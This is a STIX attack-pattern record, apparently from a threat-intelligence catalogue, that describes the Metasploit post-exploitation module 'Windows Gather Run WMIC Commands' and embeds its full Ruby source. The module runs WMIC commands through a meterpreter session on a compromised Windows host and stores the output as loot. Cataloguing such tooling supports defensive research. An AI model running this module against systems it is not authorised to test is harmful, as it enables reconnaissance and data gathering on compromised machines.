{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6b9241e-fd53-4c41-a62a-2a908b3e5a91",
    "created": "2024-08-14T16:33:05.027725Z",
    "modified": "2024-08-14T16:33:05.027728Z",
    "name": "Windows Gather Run WMIC Commands",
    "description": " This module executes WMIC commands on the specified host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/wmic_command.rb",
            "external_id": "wmic_command.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::WMIC\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Run WMIC Commands',\n        'Description' => %q{\n          This module executes WMIC commands on the specified host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options([\n      OptPath.new('RESOURCE', [false, 'Full path to resource file containing WMIC commands']),\n      OptString.new('COMMAND', [false, 'WMIC command']),\n    ])\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    resource_file = datastore['RESOURCE']\n    command = datastore['COMMAND']\n\n    if command.blank? && resource_file.blank?\n      fail_with(Failure::BadConfig, 'Please specify COMMAND or RESOURCE file.')\n    end\n\n    commands = []\n\n    if resource_file\n      fail_with(Failure::BadConfig, \"Resource file #{resource_file} does not exist!\") unless ::File.exist?(resource_file)\n\n      ::File.open(resource_file).each_line(chomp: true) do |cmd|\n        next if cmd.strip.empty?\n        next if cmd.starts_with?('#')\n\n        commands << cmd\n      end\n    else\n      commands << command\n    end\n\n    commands.each do |cmd|\n      next if cmd.strip.empty?\n\n      print_status(\"Running WMIC command: #{cmd}\")\n\n      result = wmic_query(cmd)\n\n      if result.blank?\n        print_error('No results for command')\n        next\n      end\n\n      vprint_line(result)\n\n      store_wmic_loot(result, cmd)\n    end\n  end\n\n  def store_wmic_loot(result_text, cmd)\n    command_log = store_loot(\n      'host.command.wmic',\n      'text/plain',\n      session,\n      result_text,\n      \"#{cmd.gsub(%r{\\.|/|\\s}, '_')}.txt\",\n      \"Command Output 'wmic #{cmd}'\"\n    )\n\n    print_status(\"Command output saved to: #{command_log}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}